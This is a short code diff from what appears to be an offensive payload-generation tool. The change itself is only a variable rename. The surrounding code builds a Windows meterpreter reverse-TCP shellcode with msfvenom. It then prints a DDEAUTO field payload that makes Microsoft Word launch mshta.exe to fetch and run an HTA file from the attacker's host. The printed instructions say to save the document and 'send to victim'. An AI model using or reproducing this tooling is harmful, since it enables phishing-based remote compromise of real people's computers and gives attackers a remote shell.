@@ -213,7 +213,7 @@ class payloads:
 
 try:
 
-    generate_shellcode = "/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ask.lhost + " LPORT=" + ask.lport + " -f raw -o payload.bin &>/dev/null"
+    generate_shellcode = "/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ask.LHOST + " LPORT=" + ask.LPORT + " -f raw -o payload.bin &>/dev/null"
     before_execute()
 
     text("Generating shellcode file...")
@@ -230,7 +230,7 @@ try:
     gen_hta_open.close()
 
     os.system("chmod +x bind.sh && ./bind.sh")
-    text('Open Microsoft Word and press CTRL+F9 and copy the payload below in between the { } then save and send to victim\n\033[94mHTA PAYLOAD\033[0m: DDEAUTO C:\\Programs\\Microsoft\\Office\\MSword.exe\\..\\..\\..\\..\\windows\\system32\\mshta.exe "http://' + ask.lhost + '/Mental.hta"')
+    text('Open Microsoft Word and press CTRL+F9 and copy the payload below in between the { } then save and send to victim\n\033[94mHTA PAYLOAD\033[0m: DDEAUTO C:\\Programs\\Microsoft\\Office\\MSword.exe\\..\\..\\..\\..\\windows\\system32\\mshta.exe "http://' + ask.LHOST + '/Mental.hta"')
     os.remove("bind.sh")
     os.remove("payload.bin")
 
